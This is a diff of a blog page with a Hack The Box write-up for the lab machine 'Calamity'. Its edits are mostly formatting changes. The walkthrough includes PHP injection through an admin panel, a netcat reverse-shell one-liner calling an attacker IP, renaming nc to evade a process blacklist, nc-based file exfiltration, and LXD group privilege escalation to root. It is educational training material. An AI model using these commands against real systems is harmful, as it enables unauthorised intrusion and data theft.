@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en-US">
   <head>
-    <meta name="generator" content="Hugo 0.56.3" />
+    <meta name="generator" content="Hugo 0.64.1" />
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Hack The Box Write-up - Calamity | text/plain</title>
@@ -20,8 +20,7 @@
 <meta property="og:description" content="Write-up for the Hack The Box machine called Calamity. Involves basic enumeration, finding a way into a hidden admin panel of the webserver, injecting PHP code after getting past the login, evading an intrusion detection system, recovering an SSH password hidden inside audio files and finally using LXD/LXD to exploit a user administration mistake to get root." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://dominicbreuker.com/post/htb_calamity/" />
-
-<meta property="og:image" content="https://source.unsplash.com/category/technology/2000x1322" />
+<meta property="og:image" content="https://source.unsplash.com/category/technology/2000x1322"/>
 <meta property="article:published_time" content="2018-01-26T00:00:00+01:00" />
 <meta property="article:modified_time" content="2018-01-26T00:00:00+01:00" />
 
@@ -222,16 +221,14 @@ figure a:hover {
   <article itemscope itemtype="http://schema.org/BlogPosting">
     <meta itemprop="name" content="Hack The Box Write-up - Calamity">
 <meta itemprop="description" content="Write-up for the Hack The Box machine called Calamity. Involves basic enumeration, finding a way into a hidden admin panel of the webserver, injecting PHP code after getting past the login, evading an intrusion detection system, recovering an SSH password hidden inside audio files and finally using LXD/LXD to exploit a user administration mistake to get root.">
-
-
 <meta itemprop="datePublished" content="2018-01-26T00:00:00&#43;01:00" />
 <meta itemprop="dateModified" content="2018-01-26T00:00:00&#43;01:00" />
 <meta itemprop="wordCount" content="1951">
+<meta itemprop="image" content="https://source.unsplash.com/category/technology/2000x1322"/>
 
 
 
 <meta itemprop="keywords" content="ctf,infosec,hackthebox,write-up," />
-
     <script async src="/js/baffle.js"></script>
     <header>
       <h1 class="baffle" itemprop="headline">Hack The Box Write-up - Calamity</h1>
@@ -257,19 +254,11 @@ figure a:hover {
   <details>
     <summary>Table of Contents</summary>
     <nav id="TableOfContents">
-<ul>
-<li><a href="#enumeration">Enumeration</a></li>
-<li><a href="#from-rce-to-shell">From RCE to shell</a></li>
-<li><a href="#audio-steganography">Audio steganography</a></li>
-<li><a href="#privesc-with-lxd-lxc">Privesc with LXD/LXC</a>
-<ul>
-<li><a href="#prepare-image">Prepare image</a></li>
-<li><a href="#prepare-container">Prepare container</a></li>
-<li><a href="#run-shell">Run shell</a></li>
-</ul></li>
-<li><a href="#buffer-overflow">Buffer overflow</a></li>
-<li><a href="#links">Links</a></li>
-</ul>
+  <ul>
+    <li><a href="#prepare-image">Prepare image</a></li>
+    <li><a href="#prepare-container">Prepare container</a></li>
+    <li><a href="#run-shell">Run shell</a></li>
+  </ul>
 </nav>
   </details>
   <script>
@@ -289,19 +278,15 @@ figure a:hover {
 
 
     <div itemprop="articleBody">
-      
-
-<p><a href="https://www.hackthebox.eu/">Hack The Box</a> is a new company offering lab servers you can test penetration testing techniques on.
+      <p><a href="https://www.hackthebox.eu/">Hack The Box</a> is a new company offering lab servers you can test penetration testing techniques on.
 It is quite educative and a lot of fun.
 They have multiple machines and all follow a similar pattern.
 You start with an IP address, have to find a way to get code execution on the machine (usually as an unprivileged user) and have to escalate from there to root.
 This post is about one of the machines called calamity.
 It&rsquo;s a full walkthrough of all steps needed to become root.</p>
-
 <p>Below are the statistics for this machine.
 You can see lots of people finished to code execution part, which is pretty easy.
 The second part though was really though, unless you find the easy but not well-known way via LXD.</p>
-
 
 
 
@@ -338,11 +323,9 @@ The second part though was really though, unless you find the easy but not well-
   }
 </style>
 
-
 <h1 id="enumeration">Enumeration</h1>
-
 <p>Given the IP, we start with a basic nmap scan:</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span>root@kali ~ $ nmap -sV -sC -oN nmap <span style="color: #ae81ff">10</span>.10.10.27
+<pre><code class="language-console" data-lang="console">root@kali ~ $ nmap -sV -sC -oN nmap 10.10.10.27
 Nmap scan report for 10.10.10.27
 Host is up (0.042s latency).
 Not shown: 998 closed ports
@@ -356,28 +339,22 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: Apache/2.4.18 (Ubuntu)
 |_http-title: Brotherhood Software
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</code></pre></div>
-
-<p>Not too much to see.
+</code></pre><p>Not too much to see.
 We proceed by inspecting the webserver
 In the background, run a tool like dirbuster or Gobuster to enumerate.
 The landing page is a picture with no further content.
 However, after a short while, the tools find more endpoints:</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span>root@kali ~ $ gobuster -x php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.27/ -o ./gobuster.php.log
+<pre><code class="language-console" data-lang="console">root@kali ~ $ gobuster -x php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.27/ -o ./gobuster.php.log
 /uploads (Status: 301)
 /admin.php (Status: 200)
-</code></pre></div>
-
-<p>The uploads folder is empty and does not really help.
+</code></pre><p>The uploads folder is empty and does not really help.
 However, the admin page is quite interesting.
 It prompts for a password and username.
 SQL injection might be the next thing to try, but in this case, merely looking at the HTML source is enough.
 You can find a password in the comments.
 You can also see the labels of username and password are switched, i.e., you have to put the password into the username field and vice versa.</p>
-
 <p>The comments reveal only a password but no user.
 It is not hard to guess the username though since it is &ldquo;admin&rdquo; (probably most people&rsquo;s first try).</p>
-
 
 
 
@@ -414,18 +391,14 @@ It is not hard to guess the username though since it is &ldquo;admin&rdquo; (pro
   }
 </style>
 
-
 <h1 id="from-rce-to-shell">From RCE to shell</h1>
-
 <p>After login, you get to a page with a lot of strange text.
 At the bottom, there is a form field with a button which invites you to submit some HTML.
 If you do, you see it rendered on the page.
 The text also mentions PHP.</p>
-
 <p>If you try to submit some PHP rather than HTML, you see it gets evaluated too.
 This gets us immediate code execution.
 To test, list the current directory:</p>
-
 
 
 
@@ -462,70 +435,54 @@ To test, list the current directory:</p>
   }
 </style>
 
-
 <p>Since we have code execution, it&rsquo;s time to get a shell.
 Pick a webshell from <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentestmonkey</a> and run a system call through PHP like so: <code>&lt;?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.15.130 1234 &gt;/tmp/f') ?&gt;</code>.
 Before submitting it, don&rsquo;t forget to run netcat locally to catch the shell.</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span>root@kali ~ $ nc -lnvp <span style="color: #ae81ff">1234</span>
+<pre><code class="language-console" data-lang="console">root@kali ~ $ nc -lnvp 1234
 listening on [any] 1234 ...
 connect to [10.10.15.130] from (UNKNOWN) [10.10.10.27] 53200
-/bin/sh: 0: can&#39;t access tty; job control turned off
+/bin/sh: 0: can't access tty; job control turned off
 root@kali ~ $
-</code></pre></div>
-
-<p>It works, but the shell is killed immediately after the connection is established.
+</code></pre><p>It works, but the shell is killed immediately after the connection is established.
 We must stick to the web shell for now and find out why this is happening.
 Look around in the home directory of user <code>xalvas</code>, which is full of interesting files (<code>&lt;?php system('ls -lah /home/xalvas') ?&gt;</code>).
 In particular, there is a file called INTRUSIONS, which appears to list intrusion attempts the system has identified.
 Open it with <code>&lt;?php system('cat /home/xalvas/intrusions') ?&gt;</code> and you see:</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span>[...]
+<pre><code class="language-console" data-lang="console">[...]
 POSSIBLE INTRUSION BY BLACKLISTED PROCCESS nc ...PROCESS KILLED AT 2018-01-21 16:19:35.379876
-</code></pre></div>
-
-<p>Comparing against the date with <code>&lt;?php system('ls -lah /home/xalvas') ?&gt;</code>, which prints <code>Sun Jan 21 16:24:44 EST 2018</code>, we can see that this linewas likely produced due to our use of nc.
+</code></pre><p>Comparing against the date with <code>&lt;?php system('ls -lah /home/xalvas') ?&gt;</code>, which prints <code>Sun Jan 21 16:24:44 EST 2018</code>, we can see that this linewas likely produced due to our use of nc.
 Assuming intrusions are detected by comparing filename to a blacklist, all we have to do is create a version of nc with a harmles name:</p>
-
 <ol>
 <li><code>&lt;?php system('which nc') ?&gt;</code> -&gt; <code>/bin/nc</code> finds the binary</li>
 <li><code>&lt;?php system('cp /bin/nc /dev/shm/harmless') ?&gt;</code> copies it to a temp folder</li>
 <li><code>&lt;?php system('chmod +x /dev/shm/harmless') ?&gt;</code> ensures the new file is executable</li>
 <li><code>&lt;?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|/dev/shm/harmless 10.10.15.130 1234 &gt;/tmp/f') ?&gt;</code> tries again to get a shell with the copied version of nc (don&rsquo;t forget your local nc listener)</li>
 </ol>
-
 <p>Now we get a shell which is not detected.
 Running <code>id</code>, we find we are now <code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code>.</p>
-
 <h1 id="audio-steganography">Audio steganography</h1>
-
 <p>Further inspecting the home folder, we find several interesting WAV files.
 To find out more about them, we have to copy them over to our own machine.
 This is done quickly with our harmless nc binary.</p>
-
 <p>For example, this is how to copy the file <code>/home/xalvas/recov.wav</code>:</p>
-
 <ul>
 <li>locally, run <code>nc -lnvp 1235 | base64 -d &gt; recov.wav</code></li>
 <li>remotely, run <code>base64 recov.wav | /dev/shm/harmless -w 3 10.10.15.130 1235</code></li>
 </ul>
-
 <p>It&rsquo;s best to pipe the files through base64 as otherwise the files can easily get corrupted.
 Calculate MD5 sums on both machines to make 100% sure it worked correctly.
 The following MD5 sums are correct:</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span>root@kali ~/calamity/files $ md5sum *
+<pre><code class="language-console" data-lang="console">root@kali ~/calamity/files $ md5sum *
 a2c5f6ad4eee01f856348ec1e2972768  recov.wav
 a69077504fc70a0bd5a0e9ed4982a6b7  rick.wav
 553da35f2ea5e410f48762d6347ea5b8  xouzouris.mp3
-</code></pre></div>
-
-<p>If you listen to the 3 files, you notice two of them sound as if they are the same.
+</code></pre><p>If you listen to the 3 files, you notice two of them sound as if they are the same.
 The MD5 sums though demonstrate they are different.</p>
-
 <p>A popular steganography trick is to apply small, unnoticeably changes to media files that only make sense when comparing the result to the original file.
 With WAV files, it can be done as follows.
 You record a secret piece of audio that is relatively silent compared to another audio cover file, then add your secret file to the cover file.
 To recover the secret file, compare the result to the original cover.
 If you invert either of the files and add them, you get back the secret audio.</p>
-
 
 
 
@@ -562,62 +519,48 @@ If you invert either of the files and add them, you get back the secret audio.</
   }
 </style>
 
-
 <p>Having that done, we can listen to a voice reading out numbers.
 It starts with a few things, followed by a long period of silence, and then part two.
 This leaves us with two options for the password:</p>
-
 <ul>
 <li>as read out by the voice: <code>???</code></li>
 <li>2nd part first, then 1st part: <code>18547936..*</code></li>
 </ul>
-
 <p>We can try both passwords on SSH for both the <code>root</code> and <code>xalvas</code> user.
 The combination <code>xalvas</code> and <code>18547936..*</code> works and we get in.</p>
-
-<h1 id="privesc-with-lxd-lxc">Privesc with LXD/LXC</h1>
-
+<h1 id="privesc-with-lxdlxc">Privesc with LXD/LXC</h1>
 <p>With SSH access, we can do some basic enumeration for the user and the system.
 Doing so, we stumble upon a pretty simple and likely unintended privesc.
 The actual, intended way would be by exploiting a vulnerable binary located at <code>/home/xalvas/app/goodluck</code>.
 It is pretty tough though and I only describe the easy LXD-based way here.
 Check out the links at the bottom for other write-ups which contain walkthroughs for the buffer overflow.</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span>xalvas@calamity:~$ id
+<pre><code class="language-console" data-lang="console">xalvas@calamity:~$ id
 uid=1000(xalvas) gid=1000(xalvas) groups=1000(xalvas),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
 xalvas@calamity:~$ uname -a
 Linux calamity 4.4.0-81-generic #104-Ubuntu SMP Wed Jun 14 08:15:00 UTC 2017 i686 i686 i686 GNU/Linux
-</code></pre></div>
-
-<p>We notice xalvas is member of the lxd group.
+</code></pre><p>We notice xalvas is member of the lxd group.
 Like with most container technologies (e.g.,), you can run processes with root privileges via LXD.
 Thus, being member of groups like lxd are more or less equivalent to being root.
 <a href="https://reboare.github.io/lxd/lxd-escape.html">Here</a> is a blog post with some details on how to exploit this group membership.</p>
-
 <p>The privesc requires to run a container with elevated privileges and mount the host filesystem inside.
 Running containers requires an image on the machine.
 Since we do not have an internet connection on the machine, we have to copy over an image.
 The outline is as follows</p>
-
 <ol>
 <li>Build an image locally and copy image to remote host</li>
 <li>Import image into LXD, create a container and mount host filesystem</li>
 <li>Run a shell inside the container and get flag</li>
 </ol>
-
 <h2 id="prepare-image">Prepare image</h2>
-
 <p>Alpine is a popular Linux distribution to base container images on since it is so small.
 Unlike other operating systems, which may result in a few hundred megs, Alpine images are often rather small.
 In this <a href="https://github.com/saghul/lxd-alpine-builder">repository</a> you can find a simple script to build a container.
 Clone it, cd into it, then run <code>./build-alpine -a i686</code> and a tar file <code>alpine-v3.7-i686-20180121_1729.tar.gz</code> will appear.</p>
-
 <p>With SSH access, copying is as easy as running <code>scp alpine-v3.7-i686-20180121_1729.tar.gz xalvas@10.10.10.27:/dev/shm/.tmp/alpine.tar.gz</code>.</p>
-
 <h2 id="prepare-container">Prepare container</h2>
-
 <p>Importing tar files as images is explained <a href="https://stgraber.org/2016/03/30/lxd-2-0-image-management-512/">here</a>.
 The steps are as follows:</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span>xalvas@calamity:/dev/shm/.tmp$ lxc image import ./alpine.tar.gz --alias myimage
+<pre><code class="language-console" data-lang="console">xalvas@calamity:/dev/shm/.tmp$ lxc image import ./alpine.tar.gz --alias myimage
 Generating a client certificate. This may take a minute...
 If this is your first time using LXD, you should also run: sudo lxd init
 To start your first container, try: lxc launch ubuntu:16.04
@@ -629,17 +572,14 @@ xalvas@calamity:/dev/shm/.tmp$ lxc image list
 +---------+--------------+--------+------------------------------+------+--------+------------------------------+
 | myimage | facaf5923508 | no     | alpine v3.7 (20180121_17:29) | i686 | 2.37MB | Jan 21, 2018 at 8:06pm (UTC) |
 +---------+--------------+--------+------------------------------+------+--------+------------------------------+
-</code></pre></div>
-
-<p>The output above asks us to run <code>lxd init</code> but if we try, it tells us we should sudo, which we can&rsquo;t do.
+</code></pre><p>The output above asks us to run <code>lxd init</code> but if we try, it tells us we should sudo, which we can&rsquo;t do.
 Fortunately, it will work without, so it&rsquo;s ok to ignore.</p>
-
 <p>We proceed by creating the container.
 The important part about it is using the flag <code>security.privileged=true</code>, which causes the container to interact as root with the host filesystem.
 This means all we have to do it mount the whole filesystem into the container and we get access to everything.</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span>xalvas@calamity:/dev/shm/.tmp$ lxc init myimage mycontainer -c security.privileged<span style="color: #f92672">=</span><span style="color: #f8f8f2">true</span>
+<pre><code class="language-console" data-lang="console">xalvas@calamity:/dev/shm/.tmp$ lxc init myimage mycontainer -c security.privileged=true
 Creating mycontainer
-xalvas@calamity:/dev/shm/.tml$ lxc config device add mycontainer mydevice disk <span style="color: #f8f8f2">source</span><span style="color: #f92672">=</span>/ <span style="color: #f8f8f2">path</span><span style="color: #f92672">=</span>/mnt/root <span style="color: #f8f8f2">recursive</span><span style="color: #f92672">=</span><span style="color: #f8f8f2">true</span>
+xalvas@calamity:/dev/shm/.tml$ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
 Device mydevice added to mycontainer
 xalvas@calamity:/dev/shm/.tmp$ lxc list
 +-------------+---------+------+------+------------+-----------+
@@ -647,14 +587,11 @@ xalvas@calamity:/dev/shm/.tmp$ lxc list
 +-------------+---------+------+------+------------+-----------+
 | mycontainer | STOPPED |      |      | PERSISTENT | 0         |
 +-------------+---------+------+------+------------+-----------+
-</code></pre></div>
-
-<h2 id="run-shell">Run shell</h2>
-
+</code></pre><h2 id="run-shell">Run shell</h2>
 <p>The last part is starting the container and executing a shell inside.
 We can then change into the rooted host filesystem and cat out the flag.</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span>xalvas@calamity:/dev/shm/.tmp$ lxc start mycontainer
-xalvas@calamity:/dev/shm/.tmp$ lxc <span style="color: #f8f8f2">exec</span> mycontainer /bin/sh
+<pre><code class="language-console" data-lang="console">xalvas@calamity:/dev/shm/.tmp$ lxc start mycontainer
+xalvas@calamity:/dev/shm/.tmp$ lxc exec mycontainer /bin/sh
 ~ # id
 uid=0(root) gid=0(root)
 ~ # ls -la /mnt/root/
@@ -668,25 +605,18 @@ drwxr-xr-x   96 root     root          4096 Jun 28  2017 etc
 [...]
 ~ # cat /mnt/root/root/root.txt
 9be6... &lt;- flag
-</code></pre></div>
-
-<h1 id="buffer-overflow">Buffer overflow</h1>
-
+</code></pre><h1 id="buffer-overflow">Buffer overflow</h1>
 <p>If you are a container expert, chances are you would have taken another much harder path.
 A simple search for SUID binaries delivers the following result:</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span>xalvas@calamity:~$ find / -perm -4000 <span style="color: #ae81ff">2</span>&gt;/dev/null
+<pre><code class="language-console" data-lang="console">xalvas@calamity:~$ find / -perm -4000 2&gt;/dev/null
 /home/xalvas/app/goodluck
 /bin/ping6
 /bin/umount
 /bin/mount
 [...]
-</code></pre></div>
-
-<p>A file called <code>goodluck</code> sounds like you are supposed to exploit it.
+</code></pre><p>A file called <code>goodluck</code> sounds like you are supposed to exploit it.
 And indeed, it is possible.</p>
-
 <h1 id="links">Links</h1>
-
 <p>If you are interesting in other tools or, in particular, in the buffer overflow, check out <a href="https://blog.mallardlabs.com/hackthebox-calamity-writeup/">this</a> or <a href="https://forum.hackthebox.eu/discussion/comment/3107/">this</a> for two excellent walkthroughs.
 you should definitely watch <a href="https://www.youtube.com/watch?v=EloOaaGg3nA&amp;t=">this</a> video by Ippsec, who has great tutorials on all the retired machines.</p>
 
